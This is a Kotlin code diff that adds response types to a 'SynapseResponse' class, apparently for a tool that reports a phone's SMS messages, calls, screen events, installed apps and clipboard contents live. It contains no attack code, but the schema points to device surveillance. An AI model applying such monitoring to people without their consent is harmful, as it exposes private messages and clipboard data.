@@ -175,6 +175,35 @@ sealed class SynapseResponse {
     ) : SynapseResponse()
 
     @Serializable
+    @SerialName("live_status")
+    data class LiveStatusResponse(
+        val status: String,
+        val monitors: Map<String, Boolean>
+    ) : SynapseResponse()
+
+    @Serializable
+    @SerialName("live_event")
+    data class LiveEventResponse(
+        val event_type: String,
+        // SMS fields
+        val sms_address: String = "",
+        val sms_body: String = "",
+        val sms_date: Long = 0,
+        val sms_type: String = "",
+        // Call fields
+        val call_number: String = "",
+        val call_duration: Long = 0,
+        // Screen fields
+        val screen_action: String = "",
+        // Package fields
+        val package_name: String = "",
+        val app_name: String = "",
+        // Clipboard fields
+        val clipboard_text: String = "",
+        val clipboard_mime: String = "text/plain"
+    ) : SynapseResponse()
+
+    @Serializable
     @SerialName("error")
     data class ErrorResponse(
         val error: String,
